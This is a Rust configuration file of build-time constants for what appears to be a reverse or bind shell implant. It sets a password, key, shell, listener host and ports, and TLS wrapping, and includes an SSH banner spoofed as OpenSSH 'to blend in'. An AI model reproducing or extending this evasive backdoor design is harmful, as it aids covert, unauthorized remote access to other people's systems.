/// Compile-time configuration injected by build.rs from environment variables.
/// Defaults match Undertow's defaults for drop-in compatibility.

pub const PASSWORD: &str = env!("NEAP_PASSWORD");
pub const PUBKEY: &str = env!("NEAP_PUBKEY");
pub const DEFAULT_SHELL: &str = env!("NEAP_SHELL");
pub const LUSER: &str = env!("NEAP_LUSER");
pub const LHOST: &str = env!("NEAP_LHOST");
pub const LPORT: &str = env!("NEAP_LPORT");
pub const BPORT: &str = env!("NEAP_BPORT");
pub const NOCLI: &str = env!("NEAP_NOCLI");
pub const TLS_WRAP: &str = env!("NEAP_TLS_WRAP");
pub const TLS_SNI: &str = env!("NEAP_TLS_SNI");
pub const VERSION: &str = env!("NEAP_VERSION");

/// SSH server version banner — spoofed as OpenSSH to blend in.
pub const SSH_VERSION: &str = "OpenSSH_8.9";
